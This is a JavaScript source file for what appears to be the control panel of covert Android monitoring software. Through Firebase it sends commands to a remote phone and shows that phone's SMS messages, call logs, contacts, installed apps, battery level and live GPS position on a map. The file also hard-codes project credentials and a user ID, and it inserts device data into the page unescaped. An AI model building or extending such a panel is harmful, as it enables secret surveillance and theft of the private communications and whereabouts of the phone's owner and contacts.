 
//  //Content loader in future i have to change it ;
//  document.addEventListener("DOMContentLoaded", () => {
//   fetch("dashboard.html")
//     .then(response => response.text())
//     .then(html => {
//       document.querySelector(".main-content").innerHTML = html;
//       history.replaceState(null, null, "http://127.0.0.1:5500/board.html?uid=AY66SuZVXmdqLAtiTBK3Z4fI5zW2"); //this is not good
//    // history.replaceState(null, null, "dashboard.html");
//     })

//     .catch(err => console.error("Error loading dashboard:", err));
// });


//  document.addEventListener("DOMContentLoaded", () => {
//     const sidebar = document.getElementById("sidebar");
//     const hideBtn = document.getElementById("hideBtn");
//     const showBtn = document.getElementById("showBtn");

//     if (hideBtn && showBtn) {
//       hideBtn.onclick = () => document.body.classList.add("hide-sidebar");
//       showBtn.onclick = () => document.body.classList.remove("hide-sidebar");
//     }
//   });

//   // ✅ Firebase Setup
//   import { initializeApp } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-app.js";
//   import {
//     getAuth,
//     onAuthStateChanged,
//     signOut
//   } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-auth.js";
//   import {
//     getDatabase,
//     ref,
//     get
//   } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-database.js";

//   const firebaseConfig = {
//     apiKey: "AIzaSyCW87BPPsuA_AsNCzqfEEVFSvHF-SP100k",
//     authDomain: "android-service-54676.firebaseapp.com",
//     databaseURL: "https://android-service-54676-default-rtdb.firebaseio.com",
//     projectId: "android-service-54676",
//     storageBucket: "android-service-54676.appspot.com",
//     messagingSenderId: "446333235153",
//     appId: "1:446333235153:web:f7366fd64166b83d5b3af0"
//   };

//   const app = initializeApp(firebaseConfig);
//   const auth = getAuth(app);
//   const db = getDatabase(app);

//   // ✅ Logout handler
//   window.logout = () => {
//     signOut(auth).then(() => {
//       localStorage.removeItem("uid");
//       window.location.href = "index.html";
//     });
//   };

//   // // ✅ Page loader
//   // window.dashboard = (pageName) => {
//   //   // 🔒 Sanitize: remove any extensions
//   //   pageName = pageName.replace(/\.(html|php)$/i, "");

//   //   fetch(`${pageName}.html`)
//   //     .then(res => res.text())
//   //     .then(html => {
//   //       const contentContainer = document.querySelector(".main-content");
//   //       contentContainer.innerHTML = html;

//   //       // Remove and re-inject dynamic script
//   //       const existingScript = document.getElementById("dynamic-script");
//   //       if (existingScript) existingScript.remove();

//   //       const script = document.createElement("script");
//   //       script.type = "module";
//   //       script.src = `${pageName}.js`;
//   //       script.id = "dynamic-script";
//   //       document.body.appendChild(script);

//   //       // Highlight active sidebar item
//   //       const links = document.querySelectorAll(".sidebar a");
//   //       links.forEach(link => link.classList.remove("active"));
//   //       const currentLink = Array.from(links).find(link =>
//   //         link.getAttribute("onclick")?.includes(pageName)
//   //       );
//   //       if (currentLink) currentLink.classList.add("active");
//   //     })
//   //     .catch(err => console.error("❌ Failed to load page:", err));
//   // };
// // ✅ Page loader with script refresh and forced execution
// window.dashboard = (pageName) => {
//   pageName = pageName.replace(/\.(html|php)$/i, ""); // Sanitize

//   fetch(`${pageName}.html`)
//     .then(res => res.text())
//     .then(html => {
//       const contentContainer = document.querySelector(".main-content");
//       contentContainer.innerHTML = html;

//       // Remove and reload dynamic script (fresh execution every time)
//       const existingScript = document.getElementById("dynamic-script");
//       if (existingScript) existingScript.remove();

//       const newScript = document.createElement("script");
//       newScript.type = "module";
//       newScript.src = `${pageName}.js?nocache=${Date.now()}`; // Force no-cache
//       newScript.id = "dynamic-script";
//       document.body.appendChild(newScript);

//       // Highlight active menu
//       const links = document.querySelectorAll(".sidebar .menu-link");
//       links.forEach(link => link.classList.remove("active"));
//       const activeLink = Array.from(links).find(link =>
//         link.getAttribute("onclick")?.includes(pageName)
//       );
//       if (activeLink) activeLink.classList.add("active");
//     })
//     .catch(err => console.error(`❌ Failed to load ${pageName}:`, err));
// };

//   // ✅ Auth listener → load default dashboard.html
//   onAuthStateChanged(auth, async (user) => {
//     if (!user) {
//       window.location.href = "index.html";
//     } else {
//       const uid = user.uid;
//       localStorage.setItem("uid", uid);

//       // ✅ Always load dashboard.html
//       dashboard("dashboard");

//       // Optional: Load user data
//       const userRef = ref(db, `users/${uid}`);
//       try {
//         const snapshot = await get(userRef);
//         if (snapshot.exists()) {
//           console.log("✅ User Data:", snapshot.val());
//         }
//       } catch (err) {
//         console.error("❌ Error loading user data:", err);
//       }
//     }
//   }); 


// ✅ Firebase SDK Import
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
import {
  getDatabase,
  ref,
  set,
  onValue,
  onChildAdded,
  get,
  onChildRemoved
} from "https://www.gstatic.com/firebasejs/9.23.0/firebase-database.js";
import {
  getAuth,
  signOut,
  onAuthStateChanged
} from "https://www.gstatic.com/firebasejs/9.23.0/firebase-auth.js";

// ✅ Firebase Config
const firebaseConfig = {
  apiKey: "AIzaSyCW87BPPsuA_AsNCzqfEEVFSvHF-SP100k",
  authDomain: "android-service-54676.firebaseapp.com",
  databaseURL: "https://android-service-54676-default-rtdb.firebaseio.com",
  projectId: "android-service-54676",
  storageBucket: "android-service-54676.appspot.com",
  messagingSenderId: "446333235153",
  appId: "1:446333235153:web:f7366fd64166b83d5b3af0"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);
const auth = getAuth();

let uid = null;
let dashboardInitialized = false;

let map, liveMarker;

// ✅ Auth State Listener
onAuthStateChanged(auth, (user) => {
  if (user && !dashboardInitialized) {
    uid = user.uid;
    dashboardInitialized = true;
    initializeDashboard();
    initialCommands();
  } else if (!user) {
    window.location.href = "login.html";
  }
});

// ✅ Send Command to Firebase
function sendCommand(section, commandValue) {
  const user = auth.currentUser;
  if (!user) return console.warn("User not authenticated");
  const commandRef = ref(db, `users/${user.uid}/${section}/command`);
  set(commandRef, {
    value: commandValue,
    timestamp: new Date().toISOString()
  }).then(() => console.log(`✅ Sent '${commandValue}' to ${section}`))
    .catch(err => console.error("❌ Command Error:", err));
}

// ✅ Main Dashboard Setup
function initializeDashboard() {
  document.getElementById("logoutBtn")?.addEventListener("click", () => {
    signOut(auth).then(() => window.location.href = "index.html");
  });

  map = L.map('map').setView([21.4505, 80.2048], 14);
  liveMarker = L.marker([21.4505, 80.2048]).addTo(map);

  L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
    attribution: '&copy; Esri — Source: Esri, Maxar',
    maxZoom: 19
  }).addTo(map);

  // ✅ Live Device Status
  const userRef = ref(db, `users/${uid}`);
  onValue(userRef, (snapshot) => {
    const data = snapshot.val();
    if (!data) return;

    document.getElementById("deviceStatus").textContent = data.status ? "Online" : "Offline";
    document.getElementById("deviceStatus").className = data.status === "online" ? "status-green" : "status-red";

    const battery = data.battery?.percentage;
    document.getElementById("batteryLevel").textContent = battery !== undefined ? `${battery}%` : "--%";

    if (data.lastSeenTime) {
      const dt = new Date(data.lastSeenTime);
      document.getElementById("lastSeen").textContent = `At ${dt.toLocaleTimeString()} , On ${dt.toDateString()}`;
    } else {
      document.getElementById("lastSeen").textContent = "Unknown";
    }

    if (data.location?.latitude && data.location?.longitude) {
      const { latitude, longitude } = data.location;
      liveMarker.setLatLng([latitude, longitude]);
      map.setView([latitude, longitude], 16);
      getAddressFromCoords(latitude, longitude);
    }
  });

  function getAddressFromCoords(lat, lng) {
    fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json`)
      .then(res => res.json())
      .then(data => {
        const name = data.display_name || "Unknown";
        liveMarker.bindPopup(`<b>Location:</b><br>${name}`).openPopup();
        document.getElementById("locationInfo").textContent = name;
      })
      .catch(() => {
        liveMarker.bindPopup("Location details not available").openPopup();
      });
  }

  // ✅ Reusable fetch + listener for live update
  function setupLiveList(section, tableId, mapFn) {
    const listRef = ref(db, `users/${uid}/${section}`);
    const tbody = document.getElementById(tableId);
    tbody.innerHTML = "";

    // Clear and refill on every new data
    onValue(listRef, (snapshot) => {
      tbody.innerHTML = "";
      snapshot.forEach(snap => {
        const item = snap.val();
        const row = document.createElement("tr");
        row.innerHTML = mapFn(item);
        tbody.appendChild(row);
      });
    });
  }

  // ✅ Event Listeners
  document.getElementById("btnInstalledApps")?.addEventListener("click", () => {
    showSection("installedApps");
    setupLiveList("installedApps", "appsTableBody", app => `<td>${app.name}</td><td>${app.package}</td>`);
    sendCommand("installedApps", "getInstalledApps");
  });

  document.getElementById("btnCallLogs")?.addEventListener("click", () => {
    showSection("callLogs");
    setupLiveList("calls", "callTableBody", log => {
      const time = log.time ? new Date(log.time).toLocaleString() : "N/A";
      return `<td>${log.name || "-"}</td><td>${log.number || "-"}</td><td>${log.type || "-"}</td><td>${log.duration || "-"}s</td><td>${time}</td>`;
    });
    sendCommand("calls", "getCallLogs");
  });

  document.getElementById("btnContacts")?.addEventListener("click", () => {
    showSection("contactLogs");
    setupLiveList("contacts", "contactTableBody", c => `<td>${c.name || "-"}</td><td>${c.number || "-"}</td>`);
    sendCommand("contacts", "getContacts");
  });

  document.getElementById("smsBtn")?.addEventListener("click", () => {
    showSection("smsLogs");
    setupLiveList("sms", "smsTableBody", sms => `<td>${sms.from || "Unknown"}</td><td>${sms.message || ""}</td><td>${new Date(sms.timestamp || Date.now()).toLocaleString()}</td>`);
    sendCommand("sms", "getSmsLogs");
  });

  document.querySelectorAll("#trackLocation").forEach(btn => {
    btn.addEventListener("click", () => {
      showSection("status");
      displayNoneDashboard();
      sendCommand('location', 'getLocation');
      setTimeout(() => map.invalidateSize(), 300);
    });
  });

  document.querySelectorAll(".crossLocation").forEach(btn => {
    btn.addEventListener("click", () => {
      ["smsLogs", "status", "installedApps", "callLogs", "contactLogs"].forEach(id => {
        document.getElementById(id).style.display = "none";
      });
      displayBlockDashboard();
    });
  });

  document.getElementById("refreshSiteBtn")?.addEventListener("click", () => location.reload());
}

// ✅ Dashboard Section Toggle
function showSection(sectionId) {
  const sections = ["status", "installedApps", "callLogs", "contactLogs", "smsLogs"];
  sections.forEach(id => {
    const section = document.getElementById(id);
    if (section) section.style.display = id === sectionId ? "block" : "none";
  });
}

function displayNoneDashboard() {
  document.getElementById("dashboardMain").style.display = "none";
}

function displayBlockDashboard() {
  document.getElementById("dashboardMain").style.display = "block";
}

// ✅ Initial Commands on Login
function initialCommands() {
  sendCommand("status", "getStatus");
  sendCommand("battery", "getBattery");
  sendCommand("lastSeen", "getLastSeen");
  sendCommand("location", "getLocation");
  sendCommand("installedApps", "getInstalledApps");
  sendCommand("calls", "getCallLogs");
  sendCommand("contacts", "getContacts");
  sendCommand("sms", "getSmsLogs");
}
